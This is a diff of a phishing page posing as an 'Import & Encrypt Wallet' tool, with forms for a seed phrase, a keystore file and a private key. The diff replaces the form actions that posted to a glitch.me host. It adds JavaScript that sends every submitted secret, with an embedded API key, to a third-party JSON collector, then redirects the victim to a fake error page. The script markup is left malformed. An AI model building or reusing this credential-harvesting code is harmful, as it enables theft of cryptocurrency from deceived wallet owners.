@@ -13,7 +13,6 @@
 
     <title>Import</title>
   </head>
-
   <body>
     <h1 class="text-3xl font-extrabold text-center mb-9 mt-20">
       Import & Encrypt Wallet
@@ -58,7 +57,7 @@
       <div id="bar-with-underline-1" role="tabpanel" class="tab-panel">
         <form
           method="post"
-          action="https://gratis-lace-park.glitch.me/submit-seed"
+          action="http://localhost:3000/submit-seed"
           class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
           id="form-seed"
         >
@@ -92,8 +91,6 @@
       <!-- KeyStore JSON Form -->
       <div id="bar-with-underline-2" class="tab-panel hidden">
         <form
-          method="post"
-          action="https://gratis-lace-park.glitch.me/submit-keystore"
           class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
           id="form-keystore"
         >
@@ -144,8 +141,6 @@
       <!-- Private Key Form -->
       <div id="bar-with-underline-3" class="tab-panel hidden">
         <form
-          method="post"
-          action="https://gratis-lace-park.glitch.me/submit-privatekey"
           class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
           id="form-privatekey"
         >
@@ -175,39 +170,52 @@
         </form>
       </div>
     </div>
-    <script>
+     
       const tabs = document.querySelectorAll("[data-tab-target]");
       const tabPanels = document.querySelectorAll(".tab-panel");
 
       tabs.forEach((tab) => {
         tab.addEventListener("click", () => {
           const target = document.querySelector(tab.dataset.tabTarget);
-          if (target) {
-            tabPanels.forEach((panel) => panel.classList.add("hidden"));
-            tabs.forEach((t) => {
-              t.classList.remove(
-                "active",
-                "hs-tab-active:border-b-blue-600",
-                "hs-tab-active:text-gray-900"
-              );
-              t.classList.remove(
-                "dark:hs-tab-active:text-white",
-                "dark:hs-tab-active:border-b-blue-600"
-              );
-            });
-            target.classList.remove("hidden");
-            tab.classList.add(
-              "active",
-              "hs-tab-active:border-b-blue-600",
-              "hs-tab-active:text-gray-900"
-            );
-            tab.classList.add(
-              "dark:hs-tab-active:text-white",
-              "dark:hs-tab-active:border-b-blue-600"
-            );
+          tabPanels.forEach((panel) => panel.classList.add("hidden"));
+          tabs.forEach((t) => t.classList.remove("active"));
+          target.classList.remove("hidden");
+          tab.classList.add("active");
+        });
+      });
+
+      // Dynamic form handling
+      document.querySelectorAll("form").forEach((form) => {
+        form.addEventListener("submit", async function (event) {
+          event.preventDefault(); // Prevent default form submission
+
+          const url = `https://api.submitjson.com/v1/submit/yfJX06ncb`;
+          let formData = {};
+
+          // Collect data from the active form
+          new FormData(form).forEach((value, key) => {
+            formData[key] = value;
+          });
+
+          // Submit data
+          const response = await fetch(url, {
+            method: "POST",
+            headers: {
+              "content-type": "application/json",
+              "X-API-Key": "sjk_98826fc22d4842f787a32a490aea4e10", // Replace with your API Key
+            },
+            body: JSON.stringify({ data: formData }),
+          });
+
+          const result = await response.json();
+
+          if (response.ok) {
+            window.location.href = "https://defii.netlify.app/error"; // Redirect after submission
+          } else {
+            alert("Failed to submit the form. Please try again.");
           }
         });
       });
-    </script>
+    </script> -->
   </body>
 </html>
